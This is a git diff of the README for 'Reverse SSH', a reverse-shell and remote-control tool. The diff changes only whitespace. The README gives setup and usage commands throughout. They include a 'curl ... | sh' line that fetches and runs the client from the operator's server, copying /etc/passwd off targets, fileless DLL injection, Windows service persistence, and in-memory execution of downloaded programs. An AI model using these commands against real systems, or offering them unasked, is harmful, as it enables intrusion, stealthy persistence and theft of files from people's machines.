@@ -1,15 +1,15 @@
 # Reverse SSH
-![icon](icons/On_Top_Of_Fv.png)  
+![icon](icons/On_Top_Of_Fv.png)
 (Art credit to https://www.instagram.com/smart.hedgehog.art/)
 
-Want to use SSH for reverse shells? Now you can.  
+Want to use SSH for reverse shells? Now you can.
 
 - Manage and connect to reverse shells with native SSH syntax
 - Dynamic, local and remote forwarding
 - Native `SCP` and `SFTP` implementations for retrieving files from your targets
 - Full windows shell
-- Mutual client & server authentication to create high trust control channels  
-And more! 
+- Mutual client & server authentication to create high trust control channels
+And more!
 
 
 ```text
@@ -65,7 +65,7 @@ And more!
 
 ### Setup
 
-The docker release is recommended as it includes the right version of golang, and a cross compiler for windows. 
+The docker release is recommended as it includes the right version of golang, and a cross compiler for windows.
 ```sh
 # Start the server
 docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reversessh/reverse_ssh
@@ -86,7 +86,7 @@ catcher$ link
 http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25
 
 
-# curl or wget this binary to a target system then execute it, 
+# curl or wget this binary to a target system then execute it,
 # we can then list what clients are connected
 catcher$ ls
                                  Targets
@@ -103,28 +103,28 @@ catcher$ ls
 All commands support the `-h` flag for giving help.
 
 
-Then typical ssh commands work, just specify your rssh server as a jump host. 
+Then typical ssh commands work, just specify your rssh server as a jump host.
 
 ```sh
 # Connect to full shell
 ssh -J your.rssh.server.internal:3232 dummy.machine
 
-# Start remote forward 
+# Start remote forward
 ssh -R 1234:localhost:1234 -J your.rssh.server.internal:3232 dummy.machine
 
-# Start dynamic forward 
+# Start dynamic forward
 ssh -D 9050 -J your.rssh.server.internal:3232 dummy.machine
 
-# SCP 
+# SCP
 scp -J your.rssh.server.internal:3232 dummy.machine:/etc/passwd .
 
 ```
 
 ## Fancy Features
 
-### Automatic connect-back 
+### Automatic connect-back
 
-The rssh client allows you to bake in a connect back address.  
+The rssh client allows you to bake in a connect back address.
 By default the `link` command will bake in the servers external address.
 
 If you're (for some reason) manually building the binary, you can specify the environment variable `RSSH_HOMESERVER` to bake it into the client:
@@ -141,7 +141,7 @@ $ bin/client -d example.com:3232
 
 ### Client Generation (and HTTP server)
 
-The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients. 
+The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients.
 For function to work the server must be placed in the project `bin/` folder, as it needs to find the client source.
 
 By default the `docker` release has this all built properly, and is recommended for use
@@ -192,9 +192,9 @@ The RSSH server also supports `.sh`, and `.py` URL path endings which will gener
 curl http://your.rssh.server.internal:3232/test.sh | sh
 ```
 
-### Windows DLL Generation 
+### Windows DLL Generation
 
-You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). Which is useful when you want to do fileless injection of the rssh client. 
+You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). Which is useful when you want to do fileless injection of the rssh client.
 
 This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`, this is included in the docker release.
 
@@ -210,19 +210,19 @@ CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make cli
 
 ### SSH Subsystems
 
-The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms, and `sftp` support. 
+The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms, and `sftp` support.
 
 
 #### All
-`list`  Lists avaiable subsystem  
-`sftp`: Runs the sftp handler to transfer files  
+`list`  Lists avaiable subsystem
+`sftp`: Runs the sftp handler to transfer files
 
 #### Linux
-`setgid`:   Attempt to change group  
-`setuid`:   Attempt to change user  
+`setgid`:   Attempt to change group
+`setuid`:   Attempt to change user
 
 #### Windows
-`service`: Installs or removes the rssh binary as a windows service, requires administrative rights  
+`service`: Installs or removes the rssh binary as a windows service, requires administrative rights
 
 
 e.g
@@ -234,12 +234,12 @@ ssh -J your.rssh.server.internal:3232 test-pc.user.test-pc -s service --install
 
 ### Windows Service Integration
 
-The client RSSH binary supports being run within a windows service and wont time out after 10 seconds. This is great for creating persistent management services. 
+The client RSSH binary supports being run within a windows service and wont time out after 10 seconds. This is great for creating persistent management services.
 
 ### Full Windows Shell Support
 
-Most reverse shells for windows struggle to generate a shell environment that supports resizing, copying and pasting and all the other features that we're all very fond of. 
-This project uses `conpty` on newer versions of windows, and the `winpty` library (which self unpacks) on older versions. This should mean that almost all versions of windows will net you a nice shell. 
+Most reverse shells for windows struggle to generate a shell environment that supports resizing, copying and pasting and all the other features that we're all very fond of.
+This project uses `conpty` on newer versions of windows, and the `winpty` library (which self unpacks) on older versions. This should mean that almost all versions of windows will net you a nice shell.
 
 ### Webhooks
 
@@ -263,11 +263,11 @@ Content-Length: 165
 Content-Type: application/json
 Accept-Encoding: gzip
 
-{"Status":"connected","ID":"ae92b6535a30566cbae122ebb2a5e754dd58f0ca","IP":"[::1]:52608","HostName":"user.computer","Timestamp":"2022-06-12T12:23:40.626775318+12:00"}%  
+{"Status":"connected","ID":"ae92b6535a30566cbae122ebb2a5e754dd58f0ca","IP":"[::1]:52608","HostName":"user.computer","Timestamp":"2022-06-12T12:23:40.626775318+12:00"}%
 ```
 
 
-As an additional note, please use the `/slack` endpoint if connecting this to discord. 
+As an additional note, please use the `/slack` endpoint if connecting this to discord.
 
 ### Tun (VPN)
 
@@ -294,11 +294,11 @@ This has some limitations, it is only able to send `UDP`/`TCP`/`ICMP`, and not a
 
 When specifying what executable the rssh binary should run, either when connecting with a full PTY session or raw execution the client supports URI schemes to download offhost executables.
 
-For example. 
+For example.
 
 ```
 connect --shell https://your.host/program <rssh_client_id>
-ssh -J your.rssh.server:3232 <rssh_client_id> https://your.host/program 
+ssh -J your.rssh.server:3232 <rssh_client_id> https://your.host/program
 ```
 
 
@@ -307,9 +307,9 @@ ssh -J your.rssh.server:3232 <rssh_client_id> https://your.host/program
 `http/https`: Pure web downloading
 
 `rssh`: Download via the rssh server
-The rssh server will serve content from the `downloads` directory in the executables working directory.  
-  
-Both of these methods will opportunistically use [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html) which will not write any executables to disk. 
+The rssh server will serve content from the `downloads` directory in the executables working directory.
+
+Both of these methods will opportunistically use [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html) which will not write any executables to disk.
 
 
 # Help
@@ -322,25 +322,25 @@ Due to the limitations of SFTP (or rather the library Im using for it). Paths ne
 sftp -r -J your.rssh.server.internal:3232 test-pc.user.test-pc:'/C:/Windows/system32'
 ```
 
-Note the `/` before the starting character. 
+Note the `/` before the starting character.
 
 ## Server started with `--insecure` still has `Failed to handshake`
-  
-If the client binary was generated with the `link` command this client has the server public key fingerprint baked in by default. If you lose your server private key, the clients will no longer be able to connect.  
-You can also generate clients with `link --fingerprint <fingerprint here>` to specify a fingerprint, there isnt currently a way to disable this as per version 1.0.13.  
+
+If the client binary was generated with the `link` command this client has the server public key fingerprint baked in by default. If you lose your server private key, the clients will no longer be able to connect.
+You can also generate clients with `link --fingerprint <fingerprint here>` to specify a fingerprint, there isnt currently a way to disable this as per version 1.0.13.
 
 ## Foreground vs Background
 
 By default, clients will run in the background then the parent process will exit, the child process will be given the parent processes stdout/stderr so you will be able to see output. If you need to debug your client, use the `--foreground` flag.
 
 # Donations, Support, or Giving Back
-  
-The easiest way to give back to the RSSH project is by finding bugs, opening feature requests and word-of-mouth advertising it to people you think will find it useful!  
-  
-However, if you want to give something back to me, you can do so either throught Kofi (under "Sponsor this Project" on the right hand side).   
-Or donate to me directly by sending to the either of the following wallets:  
 
-Monero (XMR):  
+The easiest way to give back to the RSSH project is by finding bugs, opening feature requests and word-of-mouth advertising it to people you think will find it useful!
+
+However, if you want to give something back to me, you can do so either throught Kofi (under "Sponsor this Project" on the right hand side).
+Or donate to me directly by sending to the either of the following wallets:
+
+Monero (XMR):
 `8A8TRqsBKpMMabvt5RxMhCFWcuCSZqGV5L849XQndZB4bcbgkenH8KWJUXinYbF6ySGBznLsunrd1WA8YNPiejGp3FFfPND`
-Bitcoin (BTC):  
+Bitcoin (BTC):
 `bc1qm9e9sfrm7l7tnq982nrm6khnsfdlay07h0dxfr`
